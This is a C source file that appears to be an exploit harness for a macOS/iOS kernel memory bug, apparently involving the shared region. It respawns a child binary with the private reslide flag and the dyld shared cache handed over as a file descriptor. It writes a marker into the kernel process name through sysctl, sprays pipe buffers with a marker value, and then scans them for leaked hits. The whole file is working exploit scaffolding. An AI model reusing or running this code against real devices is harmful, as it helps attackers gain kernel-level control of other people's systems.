#include <errno.h>
#include <fcntl.h>
#include <spawn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/sysctl.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef _POSIX_SPAWN_RESLIDE
#define _POSIX_SPAWN_RESLIDE 0x0800
#endif

#ifndef PIPE_SPRAY_COUNT
#define PIPE_SPRAY_COUNT 0
#endif

#ifndef PIPE_PAGE_SIZE
#define PIPE_PAGE_SIZE 0x4000
#endif

#ifndef PIPE_MARKER
#define PIPE_MARKER 0x5151515151515151ULL
#endif

#ifndef PARENT_PROCNAME_MARKER
#define PARENT_PROCNAME_MARKER 0
#endif

#ifndef PARENT_PROCNAME_MARKER_ARG
#define PARENT_PROCNAME_MARKER_ARG 0
#endif

extern char **environ;

static void
apply_child_dyld_env(void)
{
	const char *v;

	v = getenv("CHILD_DYLD_SHARED_CACHE_DIR");
	if (v != NULL && v[0] != '\0') {
		(void)setenv("DYLD_SHARED_CACHE_DIR", v, 1);
	}
	v = getenv("CHILD_DYLD_LIBRARY_PATH");
	if (v != NULL && v[0] != '\0') {
		(void)setenv("DYLD_LIBRARY_PATH", v, 1);
	}
	v = getenv("CHILD_DYLD_PRINT_SEARCHING");
	if (v != NULL && v[0] != '\0') {
		(void)setenv("DYLD_PRINT_SEARCHING", v, 1);
	}
	v = getenv("CHILD_DYLD_PRINT_LIBRARIES");
	if (v != NULL && v[0] != '\0') {
		(void)setenv("DYLD_PRINT_LIBRARIES", v, 1);
	}
	v = getenv("CHILD_DYLD_PRINT_INITIALIZERS");
	if (v != NULL && v[0] != '\0') {
		(void)setenv("DYLD_PRINT_INITIALIZERS", v, 1);
	}
}

#if PARENT_PROCNAME_MARKER > 0
static unsigned long long PARENT_MARKER_WORD0;
static unsigned long long PARENT_MARKER_WORD1;
static char PARENT_MARKER_WORD1_ARG[19];

static char
hex_ch(unsigned long long v)
{
	v &= 0xf;
	return (char)(v < 10 ? '0' + v : 'a' + v - 10);
}

static void
wipe_bytes(volatile unsigned char *p, size_t n)
{
	for (size_t i = 0; i < n; i++) {
		p[i] = 0;
	}
}

static unsigned long long
load_le64(const unsigned char *p)
{
	unsigned long long v = 0;
	for (unsigned i = 0; i < 8; i++) {
		v |= (unsigned long long)p[i] << (i * 8);
	}
	return v;
}

static void
set_parent_procname_marker(void)
{
	int mib[2] = { CTL_KERN, KERN_PROCNAME };
	unsigned long long seed = ((unsigned long long)getpid() << 32) ^ 0x5a17c0de9e3779b9ULL;
	char marker[33];

	marker[0] = 'z';
	marker[1] = 'x';
	marker[2] = 'n';
	marker[3] = 'u';
	marker[4] = 'L';
	marker[5] = 'P';
	marker[6] = 'E';
	marker[7] = 'p';
	for (unsigned i = 0; i < 16; i++) {
		marker[8 + i] = hex_ch(seed >> ((15 - i) * 4));
	}
	for (unsigned i = 0; i < 8; i++) {
		marker[24 + i] = hex_ch((~seed) >> ((7 - i) * 4));
	}
	marker[32] = '\0';

	PARENT_MARKER_WORD0 = load_le64((const unsigned char *)marker);
	PARENT_MARKER_WORD1 = load_le64((const unsigned char *)marker + 8);
	snprintf(PARENT_MARKER_WORD1_ARG, sizeof(PARENT_MARKER_WORD1_ARG),
	    "0x%016llx", PARENT_MARKER_WORD1);

	printf("[L] parent procname marker word0=0x%016llx\n", PARENT_MARKER_WORD0);
	printf("[L] parent procname marker word1=0x%016llx\n", PARENT_MARKER_WORD1);
	printf("[L] parent procname marker sysctl=%d\n",
	    sysctl(mib, 2, NULL, NULL, marker, sizeof(marker) - 1));
	fflush(stdout);
	wipe_bytes((volatile unsigned char *)marker, sizeof(marker));
}
#endif

#if PIPE_SPRAY_COUNT > 0
struct pipe_victim {
	int r;
	size_t len;
};

static struct pipe_victim *
setup_pipe_spray(unsigned *made_out)
{
	struct rlimit rl;
	struct pipe_victim *victims;
	unsigned char *page;
	unsigned made = 0;

	if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
		rlim_t want = PIPE_SPRAY_COUNT + 32;
		if (rl.rlim_cur < want) {
			rl.rlim_cur = want < rl.rlim_max ? want : rl.rlim_max;
			(void)setrlimit(RLIMIT_NOFILE, &rl);
		}
	}

	victims = calloc(PIPE_SPRAY_COUNT, sizeof(*victims));
	page = calloc(1, PIPE_PAGE_SIZE);
	if (victims == NULL || page == NULL) {
		fprintf(stderr, "pipe spray alloc failed\n");
		free(victims);
		free(page);
		return NULL;
	}

	for (unsigned i = 0; i < PIPE_SPRAY_COUNT; i++) {
		int p[2];
		size_t off = 0;

		if (pipe(p) != 0) {
			break;
		}
		(void)fcntl(p[0], F_SETFD, FD_CLOEXEC);
		(void)fcntl(p[1], F_SETFD, FD_CLOEXEC);
		(void)fcntl(p[1], F_SETFL, fcntl(p[1], F_GETFL, 0) | O_NONBLOCK);

		while (off < PIPE_PAGE_SIZE) {
			ssize_t n = write(p[1], page + off, PIPE_PAGE_SIZE - off);
			if (n > 0) {
				off += (size_t)n;
				continue;
			}
			if (n < 0 && errno == EINTR) {
				continue;
			}
			break;
		}
		close(p[1]);
		if (off >= sizeof(uint64_t)) {
			victims[made].r = p[0];
			victims[made].len = off;
			made++;
		} else {
			close(p[0]);
		}
	}

	free(page);
	*made_out = made;
	printf("[L] pipe spray made=%u\n", made);
	return victims;
}

static void
scan_pipe_spray(struct pipe_victim *victims, unsigned made)
{
	unsigned char *buf = malloc(PIPE_PAGE_SIZE);
	unsigned hits = 0;

	if (buf == NULL) {
		fprintf(stderr, "pipe scan alloc failed\n");
		return;
	}
	for (unsigned i = 0; i < made; i++) {
		size_t got = 0;

		while (got < victims[i].len && got < PIPE_PAGE_SIZE) {
			ssize_t n = read(victims[i].r, buf + got, victims[i].len - got);
			if (n > 0) {
				got += (size_t)n;
				continue;
			}
			if (n < 0 && errno == EINTR) {
				continue;
			}
			break;
		}
		for (size_t off = 0; off + sizeof(uint64_t) <= got; off += sizeof(uint64_t)) {
			uint64_t v;
			memcpy(&v, buf + off, sizeof(v));
			if (v == PIPE_MARKER) {
				if (hits < 16) {
					printf("[L] pipe hit index=%u off=0x%zx value=0x%016llx\n",
					    i, off, (unsigned long long)v);
				}
				hits++;
			}
		}
		close(victims[i].r);
	}
	printf("[L] pipe hits=%u\n", hits);
	free(buf);
	free(victims);
}
#endif

int
main(int argc, char **argv)
{
	const char *child = argc > 1 ? argv[1] : "/tmp/shared_region_v1_oob_static";
	const char *cache = "/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e";
	int child_arg_start = 2;
	posix_spawnattr_t attr;
	posix_spawn_file_actions_t fa;
	pid_t pid;
	int fd, ret, status;
	char *child_argv[16];
	int child_argc = 0;
#if PIPE_SPRAY_COUNT > 0
	struct pipe_victim *pipe_victims = NULL;
	unsigned pipe_made = 0;
#endif

	if (argc > 2 && argv[2][0] == '/') {
		cache = argv[2];
		child_arg_start = 3;
	}
#if PARENT_PROCNAME_MARKER > 0
	set_parent_procname_marker();
#endif
	child_argv[child_argc++] = (char *)child;
	for (int i = child_arg_start; i < argc && child_argc < 15; i++) {
		child_argv[child_argc++] = argv[i];
	}
#if PARENT_PROCNAME_MARKER > 0 && PARENT_PROCNAME_MARKER_ARG > 0
	if (child_argc < 15) {
		child_argv[child_argc++] = PARENT_MARKER_WORD1_ARG;
	}
#endif
	child_argv[child_argc] = NULL;

	fd = open(cache, O_RDONLY);
	if (fd < 0) {
		fprintf(stderr, "open(%s): %s\n", cache, strerror(errno));
		return 1;
	}

	if ((ret = posix_spawnattr_init(&attr)) != 0 ||
	    (ret = posix_spawnattr_setflags(&attr, _POSIX_SPAWN_RESLIDE | POSIX_SPAWN_SETEXEC)) != 0 ||
	    (ret = posix_spawn_file_actions_init(&fa)) != 0 ||
	    (ret = posix_spawn_file_actions_adddup2(&fa, fd, 3)) != 0) {
		fprintf(stderr, "spawn setup: %s\n", strerror(ret));
		return 1;
	}
	apply_child_dyld_env();

#if PIPE_SPRAY_COUNT > 0
	pipe_victims = setup_pipe_spray(&pipe_made);
	if (pipe_victims == NULL) {
		return 1;
	}
#endif

	ret = posix_spawn(&pid, child, &fa, &attr, child_argv, environ);
	if (ret != 0) {
		fprintf(stderr, "posix_spawn: %s\n", strerror(ret));
		return 1;
	}

	if (waitpid(pid, &status, 0) < 0) {
		fprintf(stderr, "waitpid: %s\n", strerror(errno));
		return 1;
	}
	if (WIFEXITED(status)) {
		printf("child exited %d\n", WEXITSTATUS(status));
	} else if (WIFSIGNALED(status)) {
		printf("child signaled %d\n", WTERMSIG(status));
	} else {
		printf("child status 0x%x\n", status);
	}
#if PIPE_SPRAY_COUNT > 0
	scan_pipe_spray(pipe_victims, pipe_made);
#endif
	return 0;
}
